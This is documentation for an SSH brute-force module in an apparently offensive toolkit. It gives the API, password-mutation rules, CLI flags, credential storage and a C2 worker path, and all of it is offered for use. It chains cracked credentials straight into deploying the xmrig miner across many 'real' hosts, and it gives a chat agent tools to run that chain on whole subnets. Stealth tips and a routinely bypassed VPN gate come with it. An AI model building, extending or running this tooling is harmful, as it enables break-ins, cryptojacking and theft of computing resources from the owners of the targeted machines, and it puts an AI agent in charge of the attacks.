# SSH Password Cracking

`honeywatch/crack.py` — online SSH credential guessing for the red-team initial-access phase. Source: `crack.py`.

The cracker reuses the same optional `paramiko` transport that the full fingerprint probe already depends on, so there are **no new hard dependencies**. Without `paramiko` installed the engine reports `paramiko unavailable` for every attempt and never raises — it degrades silently the same way `probe --probe-level full` does.

Recovered credentials are persisted to a `credentials` table in the main store so later `deploy` runs reuse them across sessions, and so an operator's accumulated access survives restarts.

## Model

```python
from honeywatch.crack import CrackTarget, crack_host, crack_targets, candidate_passwords

target = CrackTarget(
    ip="10.0.0.5",
    port=22,
    users=["root", "admin"],          # empty -> built-in population (root, admin, ubuntu, ...)
    passwords=[],                      # empty -> generate from wordlist + mutations
    wordlist=["summer", "company"],    # seed words
    mutations=True,                    # case + year + symbol suffix dialect
    max_attempts=None,                 # cap guesses per host (None = drain the wordlist)
    timeout_s=6.0,                     # per-attempt TCP + KEX + auth bound
    stop_on_success=True,              # stop the host after the first hit
    banner="SSH-2.0-OpenSSH_9.0",      # skip the banner grab when you already have it
)
```

- **One fresh transport per attempt.** Reusing a socket across many `auth_password` calls is fragile (one bad KEX or an auth lockout poisons the connection) and most `sshd` builds rate-limit per-connection, so a new TCP+KEX per guess is both simpler and closer to how a real attacker behaves. Concurrency is bounded by an `asyncio.Semaphore`, mirroring `fingerprint.probe.probe_many`.
- **Never raises.** Every outcome is encoded in the returned `CrackResult` (`success`, `user`, `password`, `attempts`, `errors`, `transcript`).
- **Passwords are generators, not lists.** `candidate_passwords` yields lazily; a huge wordlist never sits fully in memory.

### `CrackResult`

```python
@dataclass
class CrackResult:
    ip: str
    port: int
    banner: str | None
    success: bool
    user: str | None
    password: str | None
    attempts: int
    errors: list[str]
    transcript: list[CrackAttempt]
    error: str | None

    def credential(self) -> dict  # flat dict for the store / JSON
```

## Candidate generation

```python
from honeywatch.crack import candidate_passwords, load_wordlist, default_users

list(candidate_passwords(wordlist=["summer"], mutations=True))
# ['summer', 'Summer', 'SUMMER', 'summer1', 'summer12', 'summer123',
#  'summer1234', 'summer!', 'summer@', ..., 'summer2024', 'summer2025',
#  'Summer2024!', ...]   (deduped, built-ins prepended)
```

The built-in seed list (`_BUILTIN_PASSWORDS`) covers the most over-deployed defaults on the internet (`password`, `123456`, `P@ssw0rd`, ...) so a run with no wordlist still does something useful. `_mutate` produces the human dialect: original → Capitalized → UPPER → lower → year/symbol suffixes (`2024`, `!`, `@123`).

`load_wordlist(path)` reads a newline-separated file, skipping blanks and `#` comments, and returns `[]` on a missing/unreadable file so a bad path degrades instead of killing a long run.

## CLI

### `honeywatch crack`

```text
honeywatch crack [HOSTS...] [options]
```

Targets come from three sources, in order: positional `ip[:port]` hosts, `--target-file`, or the store (`--target-label` / `--min-confidence` / `--limit`).

| Flag | Default | Purpose |
|---|---|---|
| `--target-file PATH` | — | file with `ip[:port]` lines |
| `--target-label LABEL` | — | pull hosts from the store by final label |
| `--min-confidence F` | — | lower bound when pulling from the store |
| `--limit N` | — | cap targets pulled from the store |
| `--users a,b,c` | built-ins | usernames to try |
| `--user U` | — | pin a single username (overrides `--users`) |
| `--wordlist PATH` | — | newline-separated password wordlist |
| `--passwords a,b,c` | — | explicit passwords (bypasses wordlist/mutations) |
| `--no-mutations` | off | try wordlist entries verbatim |
| `--concurrency N` | config `crack.concurrency` (8) | parallel attempts per host |
| `--host-concurrency N` | config `crack.host_concurrency` (32) | hosts attacked at once |
| `--timeout S` | config `crack.timeout_s` (6.0) | seconds per attempt |
| `--max-attempts N` | unbounded | guesses per host before giving up |
| `--no-stop-on-success` | off | keep going after a hit (audit mode) |
| `--no-save` | off | do not persist credentials to the store |
| `--json` | off | emit results as a JSON array |
| `--skip-vpn-check` | off | bypass the Mullvad VPN gate |

```bash
# Spray a single box with a wordlist + mutations
honeywatch crack 10.0.0.5 --wordlist rockyou.txt --user root --skip-vpn-check

# Crack everything the scanner labelled real, reuse built-in population
honeywatch crack --target-label real --min-confidence 0.8 --skip-vpn-check

# Exact credentials, no wordlist, JSON output
honeywatch crack 10.0.0.5:2222 --user admin --passwords admin,123456 --json --skip-vpn-check
```

### `honeywatch creds`

Lists cracked credentials persisted by `crack`:

```bash
honeywatch creds                 # table view
honeywatch creds --ip 10.0.0.5   # filter by host
honeywatch creds --user root --json
```

## Persistence

Recovered credentials land in a dedicated `credentials` table:

```sql
CREATE TABLE IF NOT EXISTS credentials (
    ip TEXT NOT NULL,
    port INTEGER NOT NULL,
    user TEXT NOT NULL,
    password TEXT,
    banner TEXT,
    attempts INTEGER DEFAULT 0,
    source TEXT,
    discovered_at TEXT,
    PRIMARY KEY (ip, port, user)
);
```

`Store` API:

```python
store = Store("honeywatch.db")

store.upsert_credential("10.0.0.5", 22, "root", "summer2024",
                        banner="SSH-2.0-OpenSSH_9.0", attempts=12, source="crack")

rows = store.query_credentials(ip="10.0.0.5", limit=100)
# -> [{"ip": "10.0.0.5", "port": 22, "user": "root", "password": "summer2024", ...}]

cred = store.credential_for("10.0.0.5", 22)   # most recent working cred
```

Re-cracking the same `(ip, port, user)` **replaces** the row in place rather than stacking duplicates, so the store stays sharp as you learn more.

## Deploy integration

`honeywatch deploy` auto-fills `Target.ssh_user` / `Target.ssh_pass` from the credentials table when the operator did not pin `--ssh-user` / `--ssh-key` on the command line. The cracker → deploy loop therefore closes with no extra flags:

```bash
honeywatch crack --target-label real --wordlist wl.txt --skip-vpn-check
honeywatch deploy xmrig --target-label real --exec-mode ssh --skip-vpn-check
#                              ^ credentials picked up automatically
```

The worker's `ssh` exec mode now distinguishes two paths:

- **Key auth** (a `--ssh-key` was given or no password was recovered): `ssh -o BatchMode=yes`, script piped over stdin — unchanged behavior.
- **Password auth** (a cracked `ssh_pass` is present and no key): delegates to `sshpass -p <pass> ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no`.

`ssh_pass` is carried through the controller→worker serialization (both `_target_to_dict` / `_target_from_dict` in `c2/store.py` and `c2/controller.py`, plus the worker's `_task_from_dict`) so a cracked password survives the hop to a remote worker. The authoritative credential home remains the `credentials` table; the C2 transport field is transient.

## Agent tool

The chat agent gets two new tools so `crack 10.0.0.0/24 and deploy xmrig on real hosts` style commands extend to credential guessing:

- **`crack_ssh`** — runs the cracker against `hosts=...` or store-pulled targets, persists wins, returns `{hosts, successes, attempts, credentials, results}`.
- **`list_credentials`** — dumps the persisted credential table, optionally filtered by `ip` / `user`.

## Configuration

```toml
[crack]
concurrency = 8           # parallel attempts per host
host_concurrency = 32     # hosts attacked at once
timeout_s = 6.0           # seconds per attempt
max_attempts = 0          # 0/blank = unbounded; set to cap guesses per host
mutations = true          # expand wordlist with case/year/symbol dialect
save_credentials = true   # persist recovered creds to the credentials table
```

Environment overrides are unchanged from the rest of the package (`HONEYWATCH_CONFIG`, `--config PATH`).

## Notes

- Many `sshd` builds throttle or temporarily ban a source that fires too many parallel auth failures; the default `concurrency = 8` is deliberately modest. Raise it for owned lab boxes, lower it when you want stealth over speed.
- The cracker uses **password** authentication only. Key-based online attacks (id_rsa harvesting + reuse) are a separate workflow handled by the deploy key path.
- As with the rest of the red-team surface, the VPN gate (`vpn.required`) is enforced unless `--skip-vpn-check` is passed or `vpn.required = false`.